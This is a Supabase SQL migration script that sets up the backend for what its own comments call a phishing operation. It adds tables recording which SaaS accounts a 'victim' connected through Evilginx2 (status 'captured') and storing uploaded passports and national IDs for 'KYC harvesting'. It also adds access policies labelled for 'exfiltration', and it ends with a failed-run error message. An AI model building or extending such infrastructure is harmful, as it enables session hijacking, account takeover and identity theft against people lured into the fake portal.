-- ============================================================
-- SQL2: Expansion for Tool Verification & ID Document Capture
-- Run this AFTER sql1.sql has been executed.
-- ============================================================

-- 1. Expand the 'talents' table with new columns for tool/KYC tracking
--    (These use IF NOT EXISTS so they are safe to re-run)
ALTER TABLE talents 
ADD COLUMN IF NOT EXISTS verified_tools JSONB DEFAULT '[]',
ADD COLUMN IF NOT EXISTS accounting_software JSONB DEFAULT '[]',
ADD COLUMN IF NOT EXISTS operational_tools JSONB DEFAULT '[]',
ADD COLUMN IF NOT EXISTS kyc_status TEXT DEFAULT 'pending',
ADD COLUMN IF NOT EXISTS id_document_type TEXT,
ADD COLUMN IF NOT EXISTS id_document_country TEXT;

-- 2. Table for tracking which SaaS tools a victim "connected" via Evilginx2
CREATE TABLE IF NOT EXISTS tool_authorizations (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    user_id UUID,           -- The auth user ID from the portal
    platform TEXT NOT NULL,  -- e.g. 'shopify', 'gohighlevel', 'aws'
    category TEXT,           -- e.g. 'E-commerce', 'Marketing', 'Tech'
    auth_type TEXT NOT NULL DEFAULT 'session', -- 'oauth', 'credential', 'session'
    status TEXT DEFAULT 'captured'
);

-- 3. Table for storing uploaded ID documents (KYC harvesting)
CREATE TABLE IF NOT EXISTS id_documents (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    user_id UUID,
    document_type TEXT NOT NULL,    -- 'passport', 'national_id', 'drivers_license'
    country_of_issue TEXT,
    file_path TEXT,                 -- Supabase Storage path
    file_size_bytes BIGINT,
    status TEXT DEFAULT 'submitted' -- 'submitted', 'reviewed'
);

-- 4. Enable RLS on new tables
ALTER TABLE tool_authorizations ENABLE ROW LEVEL SECURITY;
ALTER TABLE id_documents ENABLE ROW LEVEL SECURITY;

-- 5. Service role policies (full access for backend/exfiltration)
CREATE POLICY "service_role_tools" ON tool_authorizations FOR ALL TO service_role USING (true);
CREATE POLICY "service_role_docs" ON id_documents FOR ALL TO service_role USING (true);

-- 6. Anon/authenticated insert policies (so the portal frontend can write)
CREATE POLICY "anon_insert_tools" ON tool_authorizations FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY "auth_insert_tools" ON tool_authorizations FOR INSERT TO authenticated WITH CHECK (true);
CREATE POLICY "anon_insert_docs" ON id_documents FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY "auth_insert_docs" ON id_documents FOR INSERT TO authenticated WITH CHECK (true);

-- 7. Create a storage bucket for ID documents (run this in Supabase Dashboard > Storage if needed)
-- INSERT INTO storage.buckets (id, name, public) VALUES ('id-documents', 'id-documents', false);



-- error while running this file: Error: Failed to run sql query: ERROR: 42P01: relation "talents" does not exist